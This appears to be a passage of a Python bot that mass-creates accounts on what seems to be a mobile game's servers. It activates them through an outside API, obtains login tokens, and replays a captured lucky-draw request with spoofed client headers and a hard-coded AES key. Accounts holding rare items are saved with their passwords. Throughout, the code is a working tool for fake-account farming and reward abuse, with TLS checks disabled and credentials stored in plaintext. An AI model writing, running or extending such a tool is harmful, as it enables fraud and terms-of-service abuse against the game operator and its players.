    def activate_one(self, acc: Dict, task_id: int, total: int) -> Optional[Dict]:
        start = time.time()
        uid = acc["uid"]
        pwd = acc["password"]
        url = f"{Config.ACTIVATE_API}?uid={uid}&password={pwd}"
        try:
            resp = self.session.get(url, timeout=15)
            elapsed = time.time() - start
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("status") == "success" or data.get("activated") is True:
                        region = data.get("region", acc.get("region", "BD"))
                        result = dict(acc)
                        result["region"] = region
                        result["activated"] = True
                        result["activated_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        result["activation_account_name"] = data.get("account_name", "Unknown")
                        result["activation_account_id"] = data.get("account_id", acc.get("account_id"))
                        print_result_box(task_id, uid, True, elapsed, region, "ACTIVATE")
                        return result
                except json.JSONDecodeError:
                    pass
            print_result_box(task_id, uid, False, elapsed, acc.get("region", "N/A"), "ACTIVATE")
            return None
        except Exception:
            elapsed = time.time() - start
            print_result_box(task_id, uid, False, elapsed, acc.get("region", "N/A"), "ACTIVATE")
            return None

    def activate_batch(self, accounts: List[Dict]) -> List[Dict]:
        total = len(accounts)
        if total == 0:
            return []
        successful = []
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(self.activate_one, acc, i + 1, total): acc
                       for i, acc in enumerate(accounts)}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res:
                        successful.append(res)
                except Exception:
                    pass
        for acc in successful:
            append_json(Config.ACTIVATED_FILE, acc)
        return successful


# ==================== SPINNER ====================
class AccountSpinner:
    def __init__(self, max_workers: int = 20):
        self.max_workers = max_workers
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=64, pool_maxsize=64, max_retries=0, pool_block=False)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.verify = False

    @staticmethod
    def aes_decrypt(d: bytes) -> bytes:
        if len(d) % 16 != 0:
            return d
        raw = AES.new(Config.AES_KEY, AES.MODE_CBC, Config.AES_IV).decrypt(d)
        try:
            return unpad(raw, AES.block_size)
        except ValueError:
            return raw

    @staticmethod
    def read_varint(data: bytes, pos: int) -> Tuple[int, int]:
        value = 0
        shift = 0
        while pos < len(data):
            b = data[pos]
            pos += 1
            value |= (b & 0x7F) << shift
            if not (b & 0x80):
                return value, pos
            shift += 7
            if shift > 70:
                raise ValueError("Invalid varint")
        raise ValueError("Incomplete varint")

    @classmethod
    def extract_item_ids(cls, raw_bytes: bytes) -> List[int]:
        data = raw_bytes
        if data.startswith(b"\x1f\x8b"):
            try:
                data = zlib.decompress(data, 16 + zlib.MAX_WBITS)
            except Exception:
                pass
        ids = set()
        sources = [data]
        try:
            dec = cls.aes_decrypt(data)
            if dec and dec != data:
                sources.append(dec)
                if dec.startswith(b"\x1f\x8b"):
                    try:
                        sources.append(zlib.decompress(dec, 16 + zlib.MAX_WBITS))
                    except Exception:
                        pass
        except Exception:
            pass

        def parse_proto(buf: bytes, depth: int = 0):
            if depth > 10:
                return
            pos = 0
            while pos < len(buf):
                try:
                    key, pos = cls.read_varint(buf, pos)
                    field_no = key >> 3
                    wire_type = key & 7
                    if field_no == 2 and wire_type == 0:
                        value, pos = cls.read_varint(buf, pos)
                        if 100_000_000 <= value <= 999_999_999:
                            ids.add(value)
                        continue
                    if wire_type == 0:
                        _, pos = cls.read_varint(buf, pos)
                    elif wire_type == 1:
                        pos += 8
                    elif wire_type == 2:
                        length, pos = cls.read_varint(buf, pos)
                        if length < 0 or pos + length > len(buf):
                            return
                        nested = buf[pos:pos + length]
                        if nested:
                            parse_proto(nested, depth + 1)
                        pos += length
                    elif wire_type == 5:
                        pos += 4
                    else:
                        return
                    if pos > len(buf):
                        return
                except Exception:
                    return

        for src in sources:
            parse_proto(src)
        return sorted(ids)

    def get_jwt(self, uid: str, password: str) -> Optional[str]:
        try:
            r = self.session.get(Config.JWT_API, params={"uid": uid, "password": password}, timeout=20)
            if r.status_code != 200:
                return None
            data = r.json()
            if not data.get("success"):
                return None
            token = data.get("token")
            if not token or token.count(".") != 2:
                return None
            return token
        except Exception:
            return None

    def send_spin(self, jwt: str) -> Tuple[int, bytes]:
        body = binascii.unhexlify(Config.SPIN_BODY_HEX)
        headers = {
            "User-Agent": UA_BASE,
            "Accept": "*/*",
            "Accept-Encoding": "deflate, gzip",
            "X-GA-SV": str(int(time.time())),
            "Authorization": f"Bearer {jwt}",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB55",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Unity-Version": "2018.4.12f1",
        }
        r = self.session.post(Config.SPIN_URL, data=body, headers=headers, timeout=20)
        return r.status_code, r.content

    def spin_one(self, acc: Dict, task_id: int, total: int) -> Dict:
        uid = acc["uid"]
        pwd = acc["password"]
        result = {"uid": uid, "password": pwd, "items": [], "rare_items": [],
                  "success": False, "reason": "", "jwt_token": ""}

        jwt = self.get_jwt(uid, pwd)
        if not jwt:
            result["reason"] = "JWT failed"
            print_result_box(task_id, uid, False, 0.0, acc.get("region", "N/A"), "SPIN")
            return result

        acc["jwt_token"] = jwt
        result["jwt_token"] = jwt

        try:
            status, resp = self.send_spin(jwt)
        except Exception as e:
            result["reason"] = f"Spin request error: {e}"
            print_result_box(task_id, uid, False, 0.0, acc.get("region", "N/A"), "SPIN")
            return result

        if status != 200:
            err = resp.decode("utf-8", errors="ignore")[:80]
            result["reason"] = f"HTTP {status}: {err}"
            print_result_box(task_id, uid, False, 0.0, acc.get("region", "N/A"), "SPIN")
            return result

        ids = self.extract_item_ids(resp)
        if not ids:
            result["reason"] = "No items extracted"
            print_result_box(task_id, uid, False, 0.0, acc.get("region", "N/A"), "SPIN")
            return result

        result["success"] = True
        result["items"] = ids

        for iid in ids:
            is_rare = iid in RARE_ITEMS_DB
            name = RARE_ITEMS_DB.get(iid, "Unknown")

            append_json(Config.ALL_ITEMS_FILE, {
                "uid": uid,
                "password": pwd,
                "item_id": iid,
                "item_name": name,
                "rare": is_rare,
                "region": acc.get("region", "UNKNOWN"),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })

            if is_rare:
                result["rare_items"].append({"item_id": iid, "item_name": name})
                append_json(Config.SPECIAL_FILE, {
                    "uid": uid,
                    "password": pwd,
                    "item_id": iid,
                    "item_name": name,
                    "region": acc.get("region", "UNKNOWN"),
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })

        print_result_box(task_id, uid, True, 0.0, acc.get("region", "N/A"), "SPIN")
        return result

    def spin_batch(self, accounts: List[Dict]) -> List[Dict]:
        total = len(accounts)
        if total == 0:
            return []
        results = []
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(self.spin_one, acc, i + 1, total): acc
                       for i, acc in enumerate(accounts)}
            for fut in as_completed(futures):
                try:
                    r = fut.result()
                    if r.get("success"):
                        results.append(r)
                    else:
                        append_json(Config.FAILED_FILE, {
                            "uid": r["uid"],
                            "password": r["password"],
                            "stage": "SPIN",
                            "reason": r.get("reason", "unknown"),
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        })
                except Exception:
                    pass
        return results


# ==================== RARE ITEMS DB ====================
RARE_ITEMS_DB = {
    211047043: "NARUTO HEAD",
    203047031: "NARUTO TOP",
    204047026: "NARUTO BOTTOM",
    205047025: "NARUTO SHOE",
    914047001: "NARUTO LOOK CHANGER",
    902047010: "NARUTO AVATAR",
}

RARITY_SCORES = {
    "LEGENDARY": 100,
    "EPIC": 75,
    "RARE": 50,
    "UNCOMMON": 25,
    "COMMON": 10,
}


# ==================== RARE / COUPLES SAVERS ====================
def save_rare_account(account_data, rarity_type, reason, rarity_score, is_ghost=False):
    try:
        if is_ghost:
            rare_filename = os.path.join(Config.GHOST_RARE_FOLDER, "rare-ghost.json")
        else:
            region = account_data.get('region', 'UNKNOWN')
            rare_filename = os.path.join(Config.RARE_ACCOUNTS_FOLDER, f"rare-{region}.json")

        rare_entry = {
            'uid': account_data["uid"],
            'password': account_data["password"],
            'account_id': account_data.get("account_id", "N/A"),
            'name': account_data["name"],
            'region': "DEVIL" if is_ghost else account_data.get('region', 'UNKNOWN'),
            'rarity_type': rarity_type,
            'rarity_score': rarity_score,
            'reason': reason,
            'date_identified': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'jwt_token': account_data.get('jwt_token', ''),
            'thread_id': account_data.get('thread_id', 'N/A')
        }

        file_lock = state.get_file_lock(rare_filename)
        with file_lock:
            rare_list = load_json(rare_filename, [])
            existing_ids = [acc.get('account_id') for acc in rare_list]
            if account_data.get("account_id", "N/A") not in existing_ids:
                rare_list.append(rare_entry)
                save_json(rare_filename, rare_list)
                return True
            return False
    except Exception as e:
        print(f"{Fore.RED}[RARE SAVE ERROR] {e}{R}")
        return False


def save_couples_account(account1, account2, reason, is_ghost=False):
    try:
        if is_ghost:
            couples_filename = os.path.join(Config.GHOST_COUPLES_FOLDER, "couples-ghost.json")
        else:
            region = account1.get('region', 'UNKNOWN')
            couples_filename = os.path.join(Config.COUPLES_ACCOUNTS_FOLDER, f"couples-{region}.json")

        couples_entry = {
            'couple_id': f"{account1.get('account_id', 'N/A')}_{account2.get('account_id', 'N/A')}",
            'account1': {
                'uid': account1["uid"], 'password': account1["password"],
                'account_id': account1.get("account_id", "N/A"),
                'name': account1["name"],
                'thread_id': account1.get('thread_id', 'N/A')
            },
            'account2': {
                'uid': account2["uid"], 'password': account2["password"],
                'account_id': account2.get("account_id", "N/A"),
                'name': account2["name"],
                'thread_id': account2.get('thread_id', 'N/A')
            },
            'reason': reason,
            'region': "DEVIL" if is_ghost else account1.get('region', 'UNKNOWN'),
            'date_matched': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }

        file_lock = state.get_file_lock(couples_filename)
        with file_lock:
            couples_list = load_json(couples_filename, [])
            existing = [c.get('couple_id') for c in couples_list]
            if couples_entry['couple_id'] not in existing:
                couples_list.append(couples_entry)
                save_json(couples_filename, couples_list)
                return True
            return False
    except Exception as e:
        print(f"{Fore.RED}[COUPLES SAVE ERROR] {e}{R}")
        return False


def analyze_and_save_rare(acc: Dict, spin_result: Dict):
    if not spin_result.get("success"):
        return
    rare_items = spin_result.get("rare_items", [])
    if not rare_items:
        return

    rarity_type = "RARE"
    rarity_score = RARITY_SCORES["RARE"]
    if len(rare_items) >= 2:
        rarity_type = "LEGENDARY"
        rarity_score = RARITY_SCORES["LEGENDARY"]
    else:
        item_name = rare_items[0]["item_name"]
        if "AVATAR" in item_name or "LOOK CHANGER" in item_name:
            rarity_type = "EPIC"
            rarity_score = RARITY_SCORES["EPIC"]

    reason = f"Found {len(rare_items)} rare item(s): " + ", ".join(
        [r["item_name"] for r in rare_items])

    acc_with_jwt = dict(acc)
    acc_with_jwt["jwt_token"] = spin_result.get("jwt_token", "")

    is_ghost = len(rare_items) >= 3
    save_rare_account(acc_with_jwt, rarity_type, reason, rarity_score, is_ghost=is_ghost)
    print(f"{Fore.MAGENTA}{B}  ★ RARE SAVED: {acc['uid']} → {rarity_type} ({reason}){R}")


# ==================== GENERATOR WORKER ====================
def generator_worker(region: str, prefix: str, target: int,
                     collected: List, collected_lock: threading.Lock):
    while not state.exit_flag:
        with state.lock:
            if state.success_count >= target:
                break

        acc = AccountGenerator.execute_creation(region, prefix)
        if acc:
            with state.lock:
                if state.success_count >= target:
                    break
                state.success_count += 1
                curr = state.success_count

            with collected_lock:
                collected.append(acc)

            print_generation_box(
                curr, target,
                acc['name'], acc['uid'], acc['password'],
                acc['account_id'], acc['region'],
                acc.get('device_model', 'N/A'),
                acc.get('ip', 'N/A'),
                acc.get('_saved_path', 'accounts/master.json')
            )
        else:
            with state.lock:
                state.failed_count += 1


# ==================== PIPELINE ====================
def run_pipeline():
    Config.ensure_dirs()

    server_menu = {"1": "BD", "2": "IND", "3": "PK", "4": "SG", "5": "ID", "6": "ME"}

    width = terminal_width()
    render_section("🔥 SERVER SELECTION", Fore.RED)
    print(_box_row("[1] 🇧🇩 Bangladesh      [2] 🇮🇳 India", width, Fore.RED, Fore.WHITE))
    print(_box_row("[3] 🇵🇰 Pakistan        [4] 🇸🇬 Singapore", width, Fore.RED, Fore.WHITE))
    print(_box_row("[5] 🇮🇩 Indonesia       [6] 🌍 Middle East", width, Fore.RED, Fore.WHITE))
    print(_box_row("────────────────────────────────────────", width, Fore.RED, Fore.RED))
    render_section_end(Fore.RED)

    choice = input(f"\n{Fore.RED}{B}  >> Select Server (1-6) : {R}").strip().lower()
    if choice not in server_menu:
        print(f"\n{Fore.RED}Err - Invalid server{R}")
        return

    region = server_menu[choice]
    prefix = input(f"{Fore.RED}{B}  >> Name Prefix        : {R}").strip() or "MASTER"

    try:
        total_target = int(input(f"{Fore.RED}{B}  >> Total Accounts to Generate : {R}"))
    except ValueError:
        print(f"\n{Fore.RED}Err - Invalid amount{R}")
        return

    if total_target <= 0:
        print(f"\n{Fore.RED}Err - Amount must be > 0{R}")
        return

    state.success_count = 0
    state.failed_count = 0
    state.exit_flag = False
    state.start_time = time.time()
    state.rate_bucket = []

    total_batches = (total_target + Config.BATCH_SIZE - 1) // Config.BATCH_SIZE

    print(f"\n{Fore.RED}{B}🚀 ULTRA TURBO PIPELINE START{R}")
    print(f"{Fore.WHITE}   Target: {total_target}  |  Batch: {Config.BATCH_SIZE}  |  "
          f"Batches: {total_batches}  |  Server: {region}{R}")
    print(f"{Fore.YELLOW}   GEN workers: {Config.GEN_WORKERS}  |  "
          f"ACT workers: {Config.ACT_WORKERS}  |  SPIN workers: {Config.SPIN_WORKERS}{R}\n")

    overall_start = time.time()
    total_generated = 0
    total_activated = 0
    total_spun = 0
    total_rare = 0

    for batch_num in range(1, total_batches + 1):
        if state.exit_flag:
            break

        remaining = total_target - total_generated
        this_batch_size = min(Config.BATCH_SIZE, remaining)

        print_batch_header(batch_num, total_batches, this_batch_size)

        # ---------- STAGE 1: GENERATE ----------
        print_stage_header("STAGE 1 / GENERATE  (ULTRA TURBO)", "⚙")
        batch_accounts: List[Dict] = []
        collected_lock = threading.Lock()
        state.success_count = 0

        with ThreadPoolExecutor(max_workers=Config.GEN_WORKERS) as ex:
            futures = [ex.submit(generator_worker, region, prefix, this_batch_size,
                                 batch_accounts, collected_lock)
                       for _ in range(Config.GEN_WORKERS)]
            try:
                while any(f.running() for f in futures):
                    time.sleep(0.1)
                    with state.lock:
                        if state.success_count >= this_batch_size:
                            break
            except KeyboardInterrupt:
                state.exit_flag = True
                print(f"\n{Fore.YELLOW}⏹ Generation stopped by user.{R}")

        print(f"\n{Fore.GREEN}{B}  ✓ Generated: {len(batch_accounts)} accounts (Batch {batch_num}){R}\n")
        total_generated += len(batch_accounts)

        if not batch_accounts:
            print(f"{Fore.RED}  ✕ No accounts generated in this batch. Skipping.{R}")
            continue

        # ---------- STAGE 2: ACTIVATE ----------
        print_stage_header("STAGE 2 / ACTIVATE", "⚡")
        activator = AccountActivator(max_workers=Config.ACT_WORKERS)
        activated = activator.activate_batch(batch_accounts)
        total_activated += len(activated)
        print(f"\n{Fore.GREEN}{B}  ✓ Activated: {len(activated)} / {len(batch_accounts)}{R}\n")

        if not activated:
            print(f"{Fore.RED}  ✕ No accounts activated in this batch. Skipping spin.{R}")
            continue

        # ---------- STAGE 3: SPIN ----------
        print_stage_header("STAGE 3 / SPIN", "🎰")
        spinner = AccountSpinner(max_workers=Config.SPIN_WORKERS)
        spin_results = spinner.spin_batch(activated)
        total_spun += len(spin_results)

        rare_count = 0
        for acc, res in zip(activated, spin_results):
            if res.get("rare_items"):
                rare_count += len(res["rare_items"])
                analyze_and_save_rare(acc, res)

        total_rare += rare_count
        print(f"\n{Fore.GREEN}{B}  ✓ Spun: {len(spin_results)} / {len(activated)}  |  "
              f"Rare items: {rare_count}{R}\n")

        _card(f"BATCH {batch_num} SUMMARY", [
            (f"GENERATED   {len(batch_accounts)}", Fore.CYAN + B),
            (f"ACTIVATED   {len(activated)}", Fore.GREEN + B),
            (f"SPUN        {len(spin_results)}", Fore.MAGENTA + B),
            (f"RARE ITEMS  {rare_count}", Fore.YELLOW + B),
        ], Fore.RED)

    # ==================== FINAL SUMMARY ====================
    total_time = time.time() - overall_start

    print()
    print(f"{Fore.RED}{B}" + "═" * terminal_width() + f"{R}")
    print_center("🔥  PIPELINE COMPLETE  🔥", Fore.RED + B)
    print(f"{Fore.RED}{B}" + "═" * terminal_width() + f"{R}")
    print()

    _card("FINAL REPORT", [
        (f"TOTAL GENERATED    {total_generated}", Fore.CYAN + B),
        (f"TOTAL ACTIVATED    {total_activated}", Fore.GREEN + B),
        (f"TOTAL SPUN         {total_spun}", Fore.MAGENTA + B),
        (f"TOTAL RARE ITEMS   {total_rare}", Fore.YELLOW + B),
        (f"TOTAL FAILED       {state.failed_count}", Fore.RED + B),
        (f"DURATION           {total_time:.2f}s", Fore.WHITE),
        (f"AVG SPEED          {total_generated / total_time:.2f} gen/s", Fore.CYAN + B),
    ], Fore.RED)

    master = load_json(Config.ACCOUNTS_FILE, [])
    activated_data = load_json(Config.ACTIVATED_FILE, [])
    all_items = load_json(Config.ALL_ITEMS_FILE, [])
    special = load_json(Config.SPECIAL_FILE, [])
    failed = load_json(Config.FAILED_FILE, [])

    print()
    _card("STORAGE REPORT", [
        (f"master.json                    {len(master)}", Fore.CYAN),
        (f"master-activated-success       {len(activated_data)}", Fore.GREEN),
        (f"all_items.json                 {len(all_items)}", Fore.MAGENTA),
        (f"special_id.json                {len(special)}", Fore.YELLOW + B),
        (f"failed_accounts.json           {len(failed)}", Fore.RED),
    ], Fore.RED)

    rare_files = glob.glob(os.path.join(Config.RARE_ACCOUNTS_FOLDER, "rare-*.json"))
    print()
    _card("RARE ACCOUNTS BY REGION", [
        (f"{os.path.basename(f):<30} {len(load_json(f, []))}", Fore.MAGENTA)
        for f in rare_files
    ] or [("No rare accounts saved yet", Fore.WHITE)], Fore.MAGENTA)

    print()
    print_center("✓  ALL STAGES COMPLETE", Fore.GREEN + B)
    print_center("🔥 DEVIL  ·  GENERATE → ACTIVATE → SPIN 🔥", Fore.RED + B)
    print_center("@MASTER_FF_01  ·  t.me/Masterofficialchannel", DIM + Fore.WHITE)
    print()


# ==================== MAIN ====================
def main():
    clear_screen()
    render_banner()
    Config.ensure_dirs()

    _card("INTEGRITY CHECK", [
        ("MASTER CREDIT   ✓ VERIFIED", Fore.GREEN + B),
        ("CHANNEL         ✓ VERIFIED", Fore.GREEN),
        ("STORAGE         ✓ accounts/ READY", Fore.GREEN),
        ("ENGINE          ⚡ ULTRA TURBO v14", Fore.RED + B),
        ("PIPELINE        ✓ GEN → ACT → SPIN", Fore.YELLOW + B),
    ], Fore.GREEN)
    print()

    width = terminal_width()
    render_section("🔥 MAIN MENU", Fore.RED)
    print(_box_row("01  FULL PIPELINE       Generate → Activate → Spin", width, Fore.RED, Fore.WHITE + B))
    print(_box_row(f"    Batch Size: {Config.BATCH_SIZE} accounts per batch", width, Fore.RED, Fore.MAGENTA))
    print(_box_row(f"    Workers: GEN {Config.GEN_WORKERS} | ACT {Config.ACT_WORKERS} | SPIN {Config.SPIN_WORKERS}", width, Fore.RED, Fore.CYAN))
    print(_box_row("────────────────────────────────────────", width, Fore.RED, Fore.RED))
    render_section_end(Fore.RED)

    choice = input(f"\n{Fore.RED}{B}  SELECT MODE {Fore.WHITE}[1]{R} › ").strip()

    if choice == "1" or choice == "":
        run_pipeline()
    else:
        print(f"{Fore.RED}✕ Invalid selection.{R}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⏹ DEVIL Pipeline stopped by user.{R}")
        sys.exit(1 if False else 0)
